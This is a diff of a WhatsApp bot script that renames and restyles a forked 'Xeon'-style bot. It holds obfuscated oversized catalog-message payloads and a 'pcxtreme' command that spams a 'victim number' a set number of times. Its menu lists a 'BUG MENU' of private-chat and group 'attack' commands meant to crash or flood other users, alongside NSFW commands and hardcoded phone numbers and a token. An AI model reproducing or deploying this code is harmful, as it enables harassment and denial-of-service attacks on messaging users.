productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+xeonbutton2}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});XeonBotInc['relayMessage'](m[_0x588892(0x1f3)],xeonordy['message'],{'messageId':xeonordy['key']['id']});
 }
 }
 break
@@ -7331,7 +7336,7 @@ var xeonoporwot = generateWAMessageFromContent(m.chat, proto.Message.fromObject(
 "surface": "CATALOG",
 "message": ownername,
 "orderTitle": wm, // 
-"sellerJid": " 916909137213@s.whatsapp.net",
+"sellerJid": " 0756224020@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: m.chat, quoted: doc })
@@ -7342,7 +7347,7 @@ break
 case 'pcxtreme': {
 
                 if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} victim number|spam amount|timer\nExample : ${command} 916909137213s.whatsapp.net|1|10s\n\n\ns = Second\n\n`)
+if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} victim number|spam amount|timer\nExample : ${command} 0756224020s.whatsapp.net|1|10s\n\n\ns = Second\n\n`)
 num = q.split('|')[0]
 amount = q.split('|')[1]
 for (let i = 0; i < amount; i++) {
@@ -7471,42 +7476,45 @@ case 'textshot': {
 //------------------------The End----------------------\\
 
 case 'tqtt': 
-throw `XEON`
+throw `Thanks to
+Nilambara (ME)
+Senuth 
+Sineth`
 break
-case 'imalsha': case 'panel': case 'list': case 'menu': case 'help': case '?': {
+case 'alive': case 'panel': case 'list': case 'menu': case 'help': case '?': {
             let ownernya = ownernomer + '@s.whatsapp.net'
             let me = m.sender
             let timestampe = speed();
             let latensie = speed() - timestampe
             let xeonezy = `┌─❖
- *Hi* 👋 
-  ${pushname} 
-✑  ${ucapanWaktu} 😄
-
-⚙𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
-
-⏳𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
-
-🧙‍♂️𝗕𝗼𝘁 : *JӨKΣЯ MD V2*
-
-🎲𝗢𝘄𝗻𝗲𝗿 : @${ownernya.split('@')[0]}
-
-⌚𝐍𝐎𝐖 𝗧𝗶𝗺𝗲 : ${xtime}
-
-
- ✑ 𝙏𝙃𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙄𝙉𝙂 𝙈𝙔 𝘽𝙊𝙏
+│ Hi 👋 
+└┬❖  ${pushname} 
+┌┤✑  ${ucapanWaktu} 😄
+│└────────────┈ ⳹
+𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
+│𝗡𝗮𝗺𝗲 : ${pushname}
+│𝗡𝘂𝗺𝗯𝗲𝗿 : @${me.split('@')[0]}
+│𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ${isPremium ? '✅' : `❌`}
+│𝗟𝗶𝗺𝗶𝘁 : ${isPremium ? '♾Infinity' : `〽️${db.data.users[m.sender].limit}`}
+│
+└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
+│𝗧𝗶𝗺𝗲 : ${xtime}
+│𝗗𝗮𝘁𝗲 : ${xdate}
+└┬────────────┈ ⳹
+   │
+   │✑DARK-NA-V2  
    └─────────────┈ ⳹`
             let ments = [ownernya, me, ini_mark]        
             let buttons = [{ buttonId: 'allmenu', buttonText: { displayText: 'All Menu' }, type: 1 },{ buttonId: 'command', buttonText: { displayText: 'List Menu' }, type: 1 },{ buttonId: 'sc', buttonText: { displayText: 'Script' }, type: 1 }]
             let buttonMessage = {
-  document: fs.readFileSync('./XeonMedia/theme/w7pgSZ.jpg'),
+  document: fs.readFileSync('./XeonMedia/theme/cheems.xlsx'),
   fileName : `${wm}`,
   mimetype: `${docs}`,
   fileLength: '99999999999999',
   pageCount: '1000000000',
   caption: xeonezy,
   footer: botname,
-  buttons: buttons,
+  //buttons: buttons,
   mentions: ments,
   headerType: 4,
   contextInfo:{externalAdReply:{
@@ -7666,10 +7674,10 @@ case 'imalsha': case 'panel': case 'list': case 'menu': case 'help': case '?': {
 							}
 						]
 const listMessage = {
-  text: "*SELECT MENU CATEGORY💎*",
-  footer: `*💎JOKER MD CREATED BY IMALSHA💎*`,
-  title: `*Hi I'AM JOKER* 👋 ${pushname}`,
-  buttonText: "SELECT CATEGORY",
+  text: "Please choose the menu",
+  footer: `${botname}\n📍YouTube: ${websitex}\n🍜Script: ${botscript}`,
+  title: `Hi 👋 ${pushname}`,
+  buttonText: "Menu",
   sections
 }
 const sendMsg = await XeonBotInc.sendMessage(m.chat, listMessage)
@@ -7679,404 +7687,728 @@ break
 var unicorn = await getBuffer(picak+'All Menu')
 
 const buttons = [
-  {buttonId: 'script', buttonText: {displayText: 'Script💎 '}, type: 1},
-  {buttonId: 'donate', buttonText: {displayText: 'ALIVE'}, type: 1},
-  {buttonId: 'owner', buttonText: {displayText: 'Owner '}, type: 1}
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
 ]
 const buttonMessage = {
     image: unicorn,
-    caption: `╔═══════✪🤴 OWNER 	
- 🤴${prefix}self
- 🤴${prefix}public
- 🤴${prefix}join [link]
- 🤴${prefix}leavegc
- 🤴${prefix}setbio
- 🤴${prefix}bctext [text]
- 🤴${prefix}bcimage [reply img/text]
- 🤴${prefix}bcvideo [reply img/text]
- 🤴${prefix}setbotpp [image]
- 🤴${prefix}setthumb [reply img]
- 🤴${prefix}setexif
- 🤴${prefix}hijack
- 🤴${prefix}creategroup [name]
- 🤴${prefix}block [tag/number]
- 🤴${prefix}unblock [tag/number]
-═══════✪ GROUP💎 	        
-💎${prefix}grouplink
-💎${prefix}ephemeral [option]
-💎${prefix}setgcpp [image]
-💎${prefix}setname [text]
-💎${prefix}setdesc [text]
-💎${prefix}group 
-💎${prefix}resetgrouplink
-💎${prefix}editinfo [option]
-💎${prefix}menfess [number]
-💎${prefix}add [user]
-💎${prefix}kick [reply/tag]
-💎${prefix}hidetag [text]
-💎${prefix}tagall [text]
-💎${prefix}antilinkgc [on/off]
-💎${prefix}antilinktg [on/off]
-💎${prefix}antilinktt [on/off]
-💎${prefix}antilinkytch [on/off]
-💎${prefix}antilinkytvid [on/off]
-💎${prefix}antilinkig [on/off]
-💎${prefix}antilinkfb [on/off]
-💎${prefix}antilinktwit [on/off]
-💎${prefix}antilinkall [on/off]
-💎${prefix}antivirus [on/off]
-💎${prefix}antitoxic [on/off]
-💎${prefix}antiwame [on/off]
-💎${prefix}nsfw [on/off]
-💎${prefix}promote [reply/tag]
-💎${prefix}demote [reply/tag]
-💎${prefix}react [reply emoji]
-💎${prefix}vote
-💎${prefix}devote
-💎${prefix}upvote
-💎${prefix}checkvote
-💎${prefix}delvote
-═══════✪ MAKER🧚‍♀️ 
-🧚‍♀️${prefix}candy
-🧚‍♀️${prefix}blackpinkneon
-🧚‍♀️${prefix}deepsea
-🧚‍♀️${prefix}scifi
-🧚‍♀️${prefix}fiction
-🧚‍♀️${prefix}berry
-🧚‍♀️${prefix}fruitjuice
-🧚‍♀️${prefix}biscuit
-🧚‍♀️${prefix}wood
-🧚‍♀️${prefix}chocolate
-🧚‍♀️${prefix}matrix
-🧚‍♀️${prefix}blood
-🧚‍♀️${prefix}halloween
-🧚‍♀️${prefix}wicker
-🧚‍♀️${prefix}darkgold
-🧚‍♀️${prefix}firework
-🧚‍♀️${prefix}skeleton
-🧚‍♀️${prefix}sand
-🧚‍♀️${prefix}glue
-🧚‍♀️${prefix}leaves
-🧚‍♀️${prefix}magma
-🧚‍♀️${prefix}lava
-🧚‍♀️${prefix}rockart
-🧚‍♀️${prefix}bloodglas
-🧚‍♀️${prefix}underwater
-🧚‍♀️${prefix}textmaker
-🧚‍♀️${prefix}honey
-🧚‍♀️${prefix}ice
-🧚‍♀️${prefix}watercolor
-🧚‍♀️${prefix}multicolor
-🧚‍♀️${prefix}snow
-🧚‍♀️${prefix}harrypot
-🧚‍♀️${prefix}harrypotter
-🧚‍♀️${prefix}brokenglass
-🧚‍♀️${prefix}waterpipe
-🧚‍♀️${prefix}spooky
-🧚‍♀️${prefix}circuit
-🧚‍♀️${prefix}metallic
-🧚‍♀️${prefix}demon
-🧚‍♀️${prefix}sparklechristmas
-🧚‍♀️${prefix}christmas
-🧚‍♀️${prefix}3dchristmas
-🧚‍♀️${prefix}3dbox
-🧚‍♀️${prefix}waterdrop
-🧚‍♀️${prefix}lion2
-🧚‍♀️${prefix}papercut
-🧚‍♀️${prefix}transformer
-🧚‍♀️${prefix}neondevil
-🧚‍♀️${prefix}3davengers
-🧚‍♀️${prefix}3dstone
-🧚‍♀️${prefix}3dstone2
-🧚‍♀️${prefix}summertime
-🧚‍♀️${prefix}thunder
-🧚‍♀️${prefix}window
-🧚‍♀️${prefix}graffiti
-🧚‍♀️${prefix}graffitibike
-🧚‍♀️${prefix}pornhub
-🧚‍♀️${prefix}glitch
-🧚‍♀️${prefix}blackpinkart
-🧚‍♀️${prefix}glitch2
-🧚‍♀️${prefix}glitch3
-🧚‍♀️${prefix}3dspace
-🧚‍♀️${prefix}lion
-🧚‍♀️${prefix}3dneon
-🧚‍♀️${prefix}greenneon
-🧚‍♀️${prefix}bokeh
-🧚‍♀️${prefix}holographic
-🧚‍♀️${prefix}bear
-🧚‍♀️${prefix}wolf
-🧚‍♀️${prefix}joker
-🧚‍♀️${prefix}dropwater
-🧚‍♀️${prefix}dropwater2
-🧚‍♀️${prefix}thewall
-🧚‍♀️${prefix}neonlight
-🧚‍♀️${prefix}natural
-🧚‍♀️${prefix}carbon
-🧚‍♀️${prefix}pencil
-🧚‍♀️${prefix}blackpink2
-🧚‍♀️${prefix}neon
-🧚‍♀️${prefix}neonlight2
-🧚‍♀️${prefix}toxic
-🧚‍♀️${prefix}strawberry
-🧚‍♀️${prefix}discovery
-🧚‍♀️${prefix}1917
-🧚‍♀️${prefix}sci_fi
-🧚‍♀️${prefix}ancient
-🧚‍♀️ ${prefix}fabric
-🧚‍♀️ ${prefix}hoorror
-🧚‍♀️ ${prefix}whitebear
-🧚‍♀️ ${prefix}juice
-🧚‍♀️ ${prefix}batman
-🧚‍♀️ ${prefix}multicolor
-🧚‍♀️ ${prefix}wonderful
-🧚‍♀️ ${prefix}sketch
-🧚‍♀️ ${prefix}marvel
-🧚‍♀️${prefix}foggy
-🧚‍♀️ ${prefix}writing
-🧚‍♀️ ${prefix}halloweenfire
-🧚‍♀️ ${prefix}halloween
-🧚‍♀️ ${prefix}watercolor
-🧚‍♀️ ${prefix}classic
-╠═════✪ DOWNLOAD⬇ 	
-⬇${prefix}tiktok [url]
-⬇${prefix}tiktokaudio [url]
-⬇${prefix}instagram [url]
-⬇${prefix}spotify [url]
-⬇${prefix}mediafire [url]
-⬇${prefix}ytmp3 [url|quality]
-⬇${prefix}ytmp4 [url|quality]
-⬇${prefix}gitclone [repo link]
-═══════✪ SEARCH🕵️‍♀️	
-🕵️‍♀️${prefix}play [query]
-🕵️‍♀️${prefix}song [query]
-🕵️‍♀️${prefix}yts [query]
-🕵️‍♀️${prefix}lyrics [query]
-🕵️‍♀️${prefix}gimage [query]
-🕵️‍♀️${prefix}google [query]
-🕵️‍♀️${prefix}anime [query]
-🕵️‍♀️${prefix}pinterest [query]
-🕵️‍♀️${prefix}image [query]
-🕵️‍♀️${prefix}wallpaper [query]
-🕵️‍♀️${prefix}searchno [number]
-🕵️‍♀️${prefix}horoscope [query]
-🕵️‍♀️${prefix}imdb [movie name]
-🕵️‍♀️${prefix}weather [loc name]
-🕵️‍♀️${prefix}genshin [char name]
-🕵️‍♀️${prefix}wikimedia [query]
-🕵️‍♀️${prefix}ytsearch [query]
-🕵️‍♀️${prefix}ringtone [query]
-═══════✪ CONVERT⚓
-⚓${prefix}toimage [reply stick]
-⚓${prefix}sticker [reply img|gif]
-⚓${prefix}take [reply img|gif|stik]
-⚓${prefix}smeme [reply img]
-⚓${prefix}emoji [emoji]
-⚓${prefix}tovideo [reply img]
-⚓${prefix}togif [reply stick]
-⚓${prefix}tovn [reply aud]
-⚓${prefix}tomp3 [reply vn]
-⚓${prefix}toaudio [reply vid]
-⚓${prefix}ebinary [reply txt]
-⚓${prefix}dbinary [reply txt]
-⚓${prefix}tinyurl [link]
-⚓${prefix}styletext [text]
-⚓${prefix}volume [reply aud]
-⚓${prefix}bass [reply aud]
-⚓${prefix}blown [reply aud]
-⚓${prefix}deep [reply aud]
-⚓${prefix}earrape [reply aud]
-⚓${prefix}fast [reply aud]
-⚓${prefix}fat [reply aud]
-⚓${prefix}nightcore [reply aud]
-⚓${prefix}reverse [reply aud]
-⚓${prefix}robot [reply aud]
-⚓${prefix}slow [reply aud]
-⚓${prefix}smooth [reply aud]
-⚓${prefix}squirrel [reply aud]
-═══════✪ IMG EFFECT🎗 
-🎗${prefix}removebg [reply img]
-═══════✪ RANDOM IMG🔱 
-🔱${prefix}coffee
-🔱 ${prefix}woof
-🔱 ${prefix}meow
-🔱 ${prefix}lizard
-🔱 ${prefix}chinese
-🔱 ${prefix}japanese
-🔱 ${prefix}korean
-🔱 ${prefix}indo
-🔱 ${prefix}thai
-🔱 ${prefix}vietnamese
-🔱 ${prefix}malay
-🔱 ${prefix}hijab
-🔱 ${prefix}randomgirl
-🔱 ${prefix}randomboy
-🔱 ${prefix}aesthetic
-🔱 ${prefix}antiwork
-🔱 ${prefix}cosplay
-🔱 ${prefix}car
-🔱 ${prefix}bike
-🔱 ${prefix}doggo
-🔱 ${prefix}cat
-🔱 ${prefix}notnot
-🔱 ${prefix}kayes
-🔱 ${prefix}justina
-🔱 ${prefix}ryujin
-🔱 ${prefix}boneka
-🔱 ${prefix}rose
-🔱 ${prefix}kpop
-🔱 ${prefix}blackpink
-🔱 ${prefix}ulzzangboy
-🔱 ${prefix}ulzzanggirl
-🔱 ${prefix}pubg
-🔱 ${prefix}hacking
-🔱 ${prefix}profilepicture
-🔱 ${prefix}couplepicture
-🔱 ${prefix}wallphone
-🔱 ${prefix}wallml
-═══════✪ RANDOM VIDEO◀
-◀ ${prefix}tiktokgirl	
-◀ ${prefix}tiktoknukhty
-◀ ${prefix}tiktokpanrika
-◀ ${prefix}tiktokkayes
-◀ ${prefix}tiktoknotnot
-◀ ${prefix}tiktokghea
-◀ ${prefix}tiktoksantuy
-◀ ${prefix}tiktokbocil
-═══════✪ EMOTE🧙‍♂️ 
-🧙‍${prefix}instagramemoji
-🧙‍${prefix}facebookemoji
-🧙‍${prefix}iphoneemoji
-🧙‍${prefix}samsungemoji
-🧙‍${prefix}joyemoji
-🧙‍${prefix}skypeemoji
-🧙‍${prefix}twitteremoji
-🧙‍${prefix}whatsappemoji
-🧙‍${prefix}microsoftemoji
-🧙‍${prefix}googleemoji
-🧙‍${prefix}pediaemoji
-🧙‍${prefix}microsoftemoji
-═══════✪ ANIME🕹 
-🕹 ${prefix}animeneko
-🕹 ${prefix}waifu
-🕹 ${prefix}animewaifu
-🕹 ${prefix}animeawoo
-🕹 ${prefix}shinobu
-🕹 ${prefix}foxgirl
-🕹 ${prefix}animemegumin
-══════✪ STICKER🛬
-🛬 ${prefix}patrick
-🛬 ${prefix}emoji
-🛬 ${prefix}emojimix
-🛬 ${prefix}doge
-🛬 ${prefix}lovesticker
-🛬 ${prefix}animestick
-🛬 ${prefix}spongebob
-🛬 ${prefix}gojosatoru
-🛬 ${prefix}nicholas
-🛬 ${prefix}cartoon
-🛬 ${prefix}stickman
-════✪ ANIME STICKER👨‍🌾 
-👨‍🌾${prefix}loli
-👨‍🌾${prefix}bully
-👨‍🌾${prefix}cuddle
-👨‍🌾${prefix}cry
-👨‍🌾${prefix}hug
-👨‍🌾${prefix}awoo
-👨‍🌾${prefix}kiss
-👨‍🌾${prefix}lick
-👨‍🌾${prefix}dance
-👨‍🌾${prefix}cringe
-👨‍🌾${prefix}neko
-👨‍🌾${prefix}gura
-═══════✪ NSFW⚜ 
-⚜${prefix}gifhentai
-⚜${prefix}gifblowjob
-⚜${prefix}hentaivideo
-⚜${prefix}hneko
-⚜${prefix}nwaifu
-⚜${prefix}animespank
-⚜${prefix}trap
-⚜${prefix}gasm
-⚜${prefix}ahegao
-⚜${prefix}ass
-⚜${prefix}bdsm
-⚜${prefix}blowjob
-⚜${prefix}cuckold
-⚜${prefix}cum
-⚜${prefix}milf
-⚜${prefix}eba
-⚜${prefix}ero
-⚜${prefix}femdom
-═══════✪ FUN👼 
-👼 ${prefix}say [text]
-👼 ${prefix}define [text]
-👼 ${prefix}how [text
-👼 ${prefix}when [text]
-👼 ${prefix}where [text]
-👼 ${prefix}is [text]
-👼 ${prefix}what [text]
-👼 ${prefix}playgirl
-👼 ${prefix}quotes
-══════✪ SOUND🔰 
-🔰 ${prefix}sound1
-🔰  ${prefix}sound2
-🔰  ${prefix}sound3
-🔰  ${prefix}sound4
-🔰  ${prefix}sound5
-🔰  ${prefix}sound6
-🔰  ${prefix}sound7
-🔰  ${prefix}sound8
-🔰  ${prefix}sound9
-══════✪ GAME👷‍♂️ 
-👷‍♂️  ${prefix}truth
-👷‍♂️  ${prefix}dare
-👷‍♂️  ${prefix}tictactoe
-👷‍♂️  ${prefix}delttt
-👷‍♂️  ${prefix}guess [option]
-👷‍♂️  ${prefix}math [mode]
-👷‍♂️  ${prefix}suitpvp [tag]
-══✪ ANONYMOUS CHAT🤹‍♂️ 
-🤹‍♂️ ${prefix}anonymous
-🤹‍♂️ ${prefix}start
-🤹‍♂️ ${prefix}next
-🤹‍♂️ ${prefix}leave
-══════✪ DATABASE🧭 
-🧭 ${prefix}setcmd
-🧭 ${prefix}listcmd
-🧭 ${prefix}delcmd
-🧭 ${prefix}lockcmd
-🧭 ${prefix}addmsg
-🧭 ${prefix}listmsg
-🧭 ${prefix}getmsg
-🧭 ${prefix}delmsg
-══════✪ OTHER💦 
-💦 ${prefix}alive
-💦 ${prefix}script
-💦 ${prefix}ping
-💦 ${prefix}owner
-💦 ${prefix}menu
-💦 ${prefix}delete
-💦 ${prefix}request
-💦 ${prefix}report [bug]
-═══════✪「 BUG MENU 」☠	
-════☾pc attack☽☠
-☠${prefix}pcbut [number]
-☠${prefix}pcvn [number]
-☠${prefix}pcstick [number]
-☠${prefix}pcfast [number]
-════☾gc attack☽☠
-☠${prefix}gcslow
-☠${prefix}gcfast
-☠${prefix}gcbunny
-☠${prefix}tagallbug
-════☾pc & gc attack☽☠
-☠${prefix}vnbug [amount]
-☠${prefix}docbug [amount]
-☠${prefix}pcgcslow [number]
+    caption: `╔═══════✪ OWNER 	
+╠ ${prefix}self
+╠ ${prefix}public
+╠ ${prefix}join [link]
+╠ ${prefix}leavegc
+╠ ${prefix}setbio
+╠ ${prefix}bctext [text]
+╠ ${prefix}bcimage [reply img/text]
+╠ ${prefix}bcvideo [reply img/text]
+╠ ${prefix}setbotpp [image]
+╠ ${prefix}setthumb [reply img]
+╠ ${prefix}setexif
+╠ ${prefix}hijack
+╠ ${prefix}creategroup [name]
+╠ ${prefix}block [tag/number]
+╠ ${prefix}unblock [tag/number]
+╠═══════✪ GROUP 	        
+╠${prefix}grouplink
+╠${prefix}ephemeral [option]
+╠${prefix}setgcpp [image]
